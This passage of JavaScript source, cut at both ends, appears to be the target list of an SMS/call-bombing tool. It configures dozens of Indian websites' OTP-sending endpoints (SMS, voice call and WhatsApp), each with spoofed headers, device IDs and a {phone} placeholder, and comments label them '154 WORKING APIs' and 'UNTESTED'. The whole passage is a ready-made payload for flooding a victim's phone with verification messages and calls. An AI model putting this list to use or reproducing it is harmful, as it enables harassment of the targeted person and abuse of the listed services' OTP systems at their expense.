            "Referer": "https://www.pepperfry.com/login"
        },
        data: (phone) => JSON.stringify({ mobile: phone, country: "IN" })
    },
    {
        name: "FirstCry_Aashu",
        method: "POST",
        url: "https://www.firstcry.com/api/otp/send",
        headers: {
            "Host": "www.firstcry.com",
            "Content-Type": "application/json",
            "Origin": "https://www.firstcry.com",
            "Referer": "https://www.firstcry.com/login"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Clovia_Aashu",
        method: "POST",
        url: "https://www.clovia.com/api/otp/send",
        headers: {
            "Host": "www.clovia.com",
            "Content-Type": "application/json",
            "Origin": "https://www.clovia.com",
            "Referer": "https://www.clovia.com/login"
        },
        data: (phone) => JSON.stringify({ mobile: phone, country: "IN" })
    },
    {
        name: "Bewakoof_Aashu",
        method: "POST",
        url: "https://www.bewakoof.com/api/otp/send",
        headers: {
            "Host": "www.bewakoof.com",
            "Content-Type": "application/json",
            "Origin": "https://www.bewakoof.com",
            "Referer": "https://www.bewakoof.com/login"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "SouledStore_Aashu",
        method: "POST",
        url: "https://www.souledstore.com/api/otp/send",
        headers: {
            "Host": "www.souledstore.com",
            "Content-Type": "application/json",
            "Origin": "https://www.souledstore.com",
            "Referer": "https://www.souledstore.com/login"
        },
        data: (phone) => JSON.stringify({ mobile: phone, country: "IN" })
    },
    {
        name: "Jabong_Aashu",
        method: "POST",
        url: "https://www.jabong.com/api/otp/send",
        headers: {
            "Host": "www.jabong.com",
            "Content-Type": "application/json",
            "Origin": "https://www.jabong.com",
            "Referer": "https://www.jabong.com/login"
        },
        data: (phone) => JSON.stringify({ mobile: phone, country: "IN" })
    },
    {
        name: "ShopClues_Aashu",
        method: "POST",
        url: "https://www.shopclues.com/api/otp/send",
        headers: {
            "Host": "www.shopclues.com",
            "Content-Type": "application/json",
            "Origin": "https://www.shopclues.com",
            "Referer": "https://www.shopclues.com/login"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Snapdeal_API_Aashu",
        method: "POST",
        url: "https://www.snapdeal.com/api/otp/send",
        headers: {
            "Host": "www.snapdeal.com",
            "Content-Type": "application/json",
            "Origin": "https://www.snapdeal.com",
            "Referer": "https://www.snapdeal.com/login"
        },
        data: (phone) => JSON.stringify({ mobile: phone, country: "IN" })
    },
    {
        name: "IndiaTimes_Aashu2",
        method: "POST",
        url: "https://www.indiatimes.com/api/otp/send",
        headers: {
            "Host": "www.indiatimes.com",
            "Content-Type": "application/json",
            "Origin": "https://www.indiatimes.com",
            "Referer": "https://www.indiatimes.com/login"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Dailyhunt_Aashu",
        method: "POST",
        url: "https://www.dailyhunt.in/api/otp/send",
        headers: {
            "Host": "www.dailyhunt.in",
            "Content-Type": "application/json",
            "Origin": "https://www.dailyhunt.in",
            "Referer": "https://www.dailyhunt.in/login"
        },
        data: (phone) => JSON.stringify({ mobile: phone, country: "IN" })
    },
    {
        name: "InShorts_Aashu",
        method: "POST",
        url: "https://www.inshorts.com/api/otp/send",
        headers: {
            "Host": "www.inshorts.com",
            "Content-Type": "application/json",
            "Origin": "https://www.inshorts.com",
            "Referer": "https://www.inshorts.com/login"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },

    // ============================================================
    // 🆕 NAYI 15 APIs (from user - UNTESTED)
    // ============================================================
    {
        name: "Hungama_NEW",
        method: "POST",
        url: "https://communication.api.hungama.com/v1/communication/otp",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "identifier": "home",
            "mlang": "en",
            "country_code": "IN",
            "origin": "https://www.hungama.com",
            "referer": "https://www.hungama.com/"
        },
        data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un", messageId: "1", emailId: "", subject: "Register", priority: "1", device: "web", variant: "v1", templateCode: 1 })
    },
    {
        name: "MeruCab_NEW",
        method: "POST",
        url: "https://merucabapp.com/api/otp/generate",
        headers: {
            "Mobilenumber": "{phone}",
            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "AppVersion": "245",
            "ApiVersion": "6.2.55",
            "DeviceType": "Android",
            "DeviceId": "44098bdebb2dc047",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "okhttp/4.9.0"
        },
        data: { "_raw": "mobile_number={phone}" }
    },
    {
        name: "DaycoIndia_NEW",
        method: "POST",
        url: "https://ekyc.daycoindia.com/api/nscript_functions.php",
        headers: {
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://ekyc.daycoindia.com",
            "Referer": "https://ekyc.daycoindia.com/verify_otp.php"
        },
        data: { "_raw": "api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp" }
    },
    {
        name: "Doubtnut_API_NEW",
        method: "POST",
        url: "https://api.doubtnut.com/v4/student/login",
        headers: {
            "version_code": "1160",
            "has_upi": "false",
            "device_model": "ASUS_I005DA",
            "android_sdk_version": "28",
            "content-type": "application/json; charset=utf-8",
            "user-agent": "okhttp/5.0.0-alpha.2"
        },
        data: (phone) => JSON.stringify({ app_version: "7.10.51", aaid: "538bd3a8-09c3-47fa-9141-6203f4c89450", course: "", phone_number: phone, language: "en", udid: "b751fb63c0ae17ba", class: "", gcm_reg_id: "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw" })
    },
    {
        name: "NoBroker_v3_NEW",
        method: "POST",
        url: "https://www.nobroker.in/api/v3/account/otp/send",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "origin": "https://www.nobroker.in",
            "referer": "https://www.nobroker.in/"
        },
        data: { "_raw": "phone={phone}&countryCode=IN" }
    },
    {
        name: "ShipRocket_NEW",
        method: "POST",
        url: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "authorization": "Bearer null",
            "origin": "https://app.shiprocket.in",
            "referer": "https://app.shiprocket.in/"
        },
        data: (phone) => JSON.stringify({ mobileNumber: phone })
    },
    {
        name: "TataCapital_Voice_NEW",
        method: "POST",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone, applSource: "", isOtpViaCallAtLogin: "true" })
    },
    {
        name: "Penpencil_Resend_NEW",
        method: "POST",
        url: "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
        headers: {
            "content-type": "application/json; charset=utf-8",
            "user-agent": "okhttp/3.9.1"
        },
        data: (phone) => JSON.stringify({ organizationId: "5eb393ee95fab7468a79d189", mobile: phone })
    },
    {
        name: "1mg_Call_NEW",
        method: "POST",
        url: "https://www.1mg.com/auth_api/v6/create_token",
        headers: {
            "content-type": "application/json; charset=utf-8",
            "user-agent": "okhttp/3.9.1"
        },
        data: (phone) => JSON.stringify({ number: phone, is_corporate_user: false, otp_on_call: true })
    },
    {
        name: "Swiggy_Call_NEW",
        method: "POST",
        url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
        headers: {
            "user-agent": "Swiggy-Android",
            "content-type": "application/json; charset=utf-8"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "KPNFresh_v2_NEW",
        method: "POST",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        headers: {
            "cache": "no-store",
            "x-channel-id": "WEB",
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.kpnfresh.com",
            "referer": "https://www.kpnfresh.com/"
        },
        data: (phone) => JSON.stringify({ phone_number: { number: phone, country_code: "+91" } })
    },
    {
        name: "ServeTel_v2_NEW",
        method: "POST",
        url: "https://api.servetel.in/v1/auth/otp",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)"
        },
        data: { "_raw": "mobile_number={phone}" }
    },

    // ============================================================
    // ✅ 154 WORKING APIs (from user)
    // ============================================================
    {
        name: "Gaana",
        method: "POST",
        url: "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile",
        headers: {
            "appVersion": "8.9.0",
            "CONTENT_TYPE": "application/json",
            "channel": "gaana.com",
            "tgid": "j9qcq0z2ur4llq2a58qqmag2",
            "sdkVersion": "1.0",
            "appVersionCode": "933",
            "deviceId": "j9qcq0z2ur4llq2a58qqmag2",
            "platform": "android",
            "sdkVersionCode": "1",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019)",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        },
        data: { "mobile": "91-{phone}" }
    },
    {
        name: "Breeze_WA",
        method: "POST",
        url: "https://api.breeze.in/session/start",
        headers: { "Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8" },
        data: (phone) => JSON.stringify({ phoneNumber: phone, authVerificationType: "otp", device: { id: "A1pKVEDhlv66KLtoYsml3", platform: "Chrome", type: "Desktop" }, countryCode: "+91" })
    },
    {
        name: "Astroyogi_V3_SMS",
        method: "POST",
        url: "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; RMX3782) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "Android",
            "authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzg0NDE0ODc0LCJleHAiOjE3OTIxOTA4NzR9.",
            "origin": "https://www.astroyogi.com",
            "referer": "https://www.astroyogi.com/registration/login.aspx"
        },
        data: (phone) => JSON.stringify({ PhoneNumber: phone, PhoneCode: "91", Domain: "Web", CountryId: "IN", IpAddress: "2409:40e4:1143:e495:8000::", CountryCodeByHeader: "IN" })
    },
    {
        name: "Myntra Voice",
        url: "https://www.myntra.com/gw/mobile-auth/voice-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "GoKwik_WA",
        method: "POST",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        headers: { "accept": "application/json", "content-type": "application/json", "gk-merchant-id": "19g6im8srkz9y" },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Kotak Voice",
        url: "https://www.kotak.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Licious_WA",
        method: "POST",
        url: "https://www.licious.in/api/login/signup",
        headers: { "Accept": "application/json", "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone, captcha_token: null })
    },
    {
        name: "Delhivery",
        method: "GET",
        url: "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "accept": "*/*"
        }
    },
    {
        name: "Refyne_Call",
        method: "POST",
        url: "https://prod-api.refyne.co.in/auth/v2/send-otp",
        headers: {
            "Content-Type": "application/json",
            "Authorization": "Bearer",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4)"
        },
        data: (phone) => JSON.stringify({ channel: "IVR", recipient: phone })
    },
    {
        name: "KPNFresh_WA",
        method: "POST",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        headers: { "x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone_number: { country_code: "+91", number: phone } })
    },
    {
        name: "DamieCloud_SMS",
        method: "GET",
        url: "https://damiecloud.online/send/{phone}",
        headers: { "User-Agent": "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36", "Accept": "*/*" }
    },
    {
        name: "Zepto Voice",
        url: "https://zepto.com/v1/user/otplogin",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"number": phone, "otpOnCall": true})
    },
    {
        name: "SmartCoin_SMS",
        method: "POST",
        url: "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "user_platform": "WEBFLOW",
            "platform_code": "olyv",
            "origin": "https://app.olyv.co.in",
            "referer": "https://app.olyv.co.in/"
        },
        data: (phone) => JSON.stringify({ phone_number: phone, app_version: "100101", channel: "SMS", request_type: "REGISTRATION", onboarding_consent: true })
    },
    {
        name: "OYO_WA",
        method: "POST",
        url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        headers: { "Accept": "application/json", "Content-Type": "text/plain;charset=UTF-8", "Cookie": "user_id=none; country_code=IN;" },
        data: (phone) => JSON.stringify({ phone: phone, country_code: "+91", nod: 4 })
    },
    {
        name: "MakeMyTrip Voice",
        url: "https://www.makemytrip.com/api/4/voice-otp/generate",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Redcliffe_WA",
        method: "POST",
        url: "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
        headers: { "accept": "application/json", "content-type": "application/json" },
        data: (phone) => JSON.stringify({ phone_number: phone, short: true, country_code: "+91" })
    },
    {
        name: "GetInstaCash",
        method: "POST",
        url: "https://getinstacash.in/sell/getData.php",
        headers: {
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://getinstacash.in",
            "Referer": "https://getinstacash.in/sell/login"
        },
        data: { "_raw": "type=sendOTP&mobile={phone}" }
    },
    {
        name: "AdityaBirla_WA",
        method: "POST",
        url: "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
        headers: { "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest" },
        data: { "_raw": "MobileNumber={phone}&functionality=signup" }
    },
    {
        name: "TataCapital_Voice",
        method: "POST",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        headers: { "Content-Type": "application/json; charset=utf-8", "User-Agent": "okhttp/3.9.1" },
        data: (phone) => JSON.stringify({ phone: phone, applSource: "", isOtpViaCallAtLogin: "true" })
    },
    {
        name: "Flipkart_2",
        method: "GET",
        url: "https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "Accept": "*/*",
            "Referer": "https://www.flipkart.com/login/verify?type=mobile&verificationType=otp&loginIdentifier={phone}&loginIdentifierPrefix=%2B91&sourceContext=default"
        }
    },
    {
        name: "IIFL_WA",
        method: "POST",
        url: "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1",
        headers: { "content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest" },
        data: { "_raw": "apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1" }
    },
    {
        name: "Astrosage_Call",
        method: "GET",
        url: "https://varta.astrosage.com/sdk/send-otp-via-call?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&operation_name=blank&jsonpcall=1&fromresend=0&_=0",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
            "Accept": "*/*",
            "X-Requested-With": "pure.lite.browser",
            "Referer": "http://www.astrosage.com/"
        }
    },
    {
        name: "Voot Voice",
        url: "https://www.voot.com/api/v1/voice-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "TradeIndia_WA",
        method: "POST",
        url: "https://apis.tradeindia.com/app_login_api/login_app",
        headers: { "accept": "application/json", "content-type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: "+91" + phone })
    },
    {
        name: "AakashDigital_2",
        method: "POST",
        url: "https://digital.aakash.ac.in/signup-otp-verify",
        headers: {
            "accept": "*/*", "origin": "https://digital.aakash.ac.in", "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://digital.aakash.ac.in/user/register"
        },
        data: { "_raw": "&mobileval={phone}" }
    },
    {
        name: "AstroSage_WA",
        method: "GET",
        url: "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank",
        headers: { "accept": "*/*", "referer": "https://www.astrosage.com/" }
    },
    {
        name: "Refyne Voice",
        url: "https://prod-api.refyne.co.in/auth/v3/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"channel": "IVR", "recipient": phone})
    },
    {
        name: "BharatLoan_WA",
        method: "POST",
        url: "https://www.bharatloan.com/login-sbm",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.bharatloan.com",
            "Referer": "https://www.bharatloan.com/apply-now",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "mobile={phone}&current_page=login&is_existing_customer=2" }
    },
    {
        name: "RedBus_1",
        method: "GET",
        url: "https://m.redbus.in/api/getOtp?number={phone}&cc=91&whatsAppOpted=undefined",
        headers: {
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "referer": "https://m.redbus.in/preregister"
        }
    },
    {
        name: "Pagarbook_WA",
        method: "POST",
        url: "https://api.pagarbook.com/api/v5/auth/otp/request",
        headers: { "accept": "application/json", "appversioncode": "5268", "clientplatform": "WEB", "content-type": "application/json", "userrole": "EMPLOYER" },
        data: (phone) => JSON.stringify({ phone: phone, language: 1 })
    },
    {
        name: "Doubtnut Voice",
        url: "https://doubtnut.com/api/v2/otpgenerate",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Snapdeal",
        method: "POST",
        url: "https://m.snapdeal.com/signupCompleteAjax",
        headers: {
            "xc": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19",
            "h2": "true",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "xg": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "u": "160081122259159083", "accept": "*/*", "origin": "https://m.snapdeal.com", "referer": "https://m.snapdeal.com/signin"
        },
        data: { "_raw": "j_password=null&j_mobilenumber={phone}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy" }
    },
    {
        name: "55Club_WA",
        method: "POST",
        url: "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
        headers: { "accept": "application/json", "content-type": "application/json;charset=UTF-8", "origin": "https://55club08.in", "referer": "https://55club08.in/" },
        data: (phone) => JSON.stringify({ phone: "91" + phone, codeType: 1, language: 0, random: "35ae48f136d74b279dbd0eeb2504e7f8", signature: "78A2879A0D46B65D257F9B29354B5DBA", timestamp: 1715445820 })
    },
    {
        name: "Zivame Voice",
        url: "https://zivame.com/api/v2/customer/login/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone_number": phone, "otp_type": "voice"})
    },
    {
        name: "Quikr",
        method: "POST",
        url: "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "accept": "*/*",
            "origin": "https://www.quikr.com", "referer": "https://www.quikr.com/"
        },
        data: { "_raw": "user={phone}&v3=true" }
    },
    {
        name: "Zerodha_WA",
        method: "POST",
        url: "https://zerodha.com/account/registration.php",
        headers: { "accept": "*/*", "content-type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone, source: "zerodha", partner_id: "" })
    },
    {
        name: "Ogonn",
        method: "POST",
        url: "https://ogonn.in/otp",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01", "origin": "https://ogonn.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "https://ogonn.in/login"
        },
        data: { "_raw": "_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={phone}" }
    },
    {
        name: "Testbook_WA",
        method: "POST",
        url: "https://api.testbook.com/api/v2/mobile/signup?mobile={phone}&clientId=1117490662.1715447223",
        headers: { "accept": "application/json", "content-type": "application/json", "x-tb-client": "web,1.2" },
        data: (phone) => JSON.stringify({ firstVisitSource: { type: "organic", utm_source: "google", utm_medium: "organic" }, mobile: phone, signupDetails: { page: "HomePage" } })
    },
    {
        name: "MyJar Call",
        url: "https://prod.myjar.app/v2/api/auth/sendOTP/call?phoneNumber={phone}",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "AakashDigital_1",
        method: "POST",
        url: "https://digital.aakash.ac.in/mkt-signup-otp-verify",
        headers: {
            "accept": "*/*", "origin": "https://digital.aakash.ac.in", "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "https://digital.aakash.ac.in/"
        },
        data: { "_raw": "&mobileval={phone}&otp=6230" }
    },
    {
        name: "MediBuddy_WA",
        method: "POST",
        url: "https://loginprod.medibuddy.in/unified-login/user/register",
        headers: { "accept": "application/json", "content-type": "application/json" },
        data: (phone) => JSON.stringify({ source: "medibuddyInWeb", platform: "medibuddy", phonenumber: phone, flow: "Retail-Login-Home-Flow" })
    },
    {
        name: "Flipkart_1",
        method: "POST",
        url: "https://1.rome.api.flipkart.com/1/action/view",
        headers: {
            "x-user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile",
            "Origin": "https://www.flipkart.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json", "Accept": "*/*", "Referer": "https://www.flipkart.com/login"
        },
        data: {
            "actionRequestContext": {
                "type": "LOGIN_IDENTITY_VERIFY", "loginIdPrefix": "+91", "loginId": "{phone}",
                "clientQueryParamMap": { "ret": "/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135", "entryPage": "HOMEPAGE_HEADER_ACCOUNT" },
                "loginType": "MOBILE", "verificationType": "OTP", "screenName": "LOGIN_V4_MOBILE", "sourceContext": "DEFAULT"
            }
        }
    },
    {
        name: "Tyreplex_WA",
        method: "POST",
        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" }
    },
    {
        name: "Swiggy_Verified",
        url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
        method: "POST",
        headers: { "user-agent": "Swiggy-Android", "content-type": "application/json; charset=utf-8" },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "KPN WhatsApp",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        method: "POST",
        headers: { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8" },
        data: (phone) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: phone } })
    },
    {
        name: "Moglix_WA",
        method: "POST",
        url: "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        headers: { "accept": "application/json", "content-type": "application/json", "origin": "https://www.moglix.com", "referer": "https://www.moglix.com/" },
        data: (phone) => JSON.stringify({ email: "", phone: phone, type: "p", source: "signup", buildVersion: "DESKTOP-7.3", device: "desktop" })
    },
    {
        name: "Hungama OTP",
        url: "https://communication.api.hungama.com/v1/communication/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un" })
    },
    {
        name: "Vidyakul_WA",
        method: "POST",
        url: "https://vidyakul.com/signup-otp/send",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://vidyakul.com",
            "referer": "https://vidyakul.com/class-12th/test-series",
            "x-csrf-token": "el0GIsHQSO3Y4upLoQOm3coVWNEiNtiKJONg2LJx",
            "x-requested-with": "XMLHttpRequest"
        },
        data: { "_raw": "phone={phone}" }
    },
    {
        name: "JioSaavn", url: "https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0",
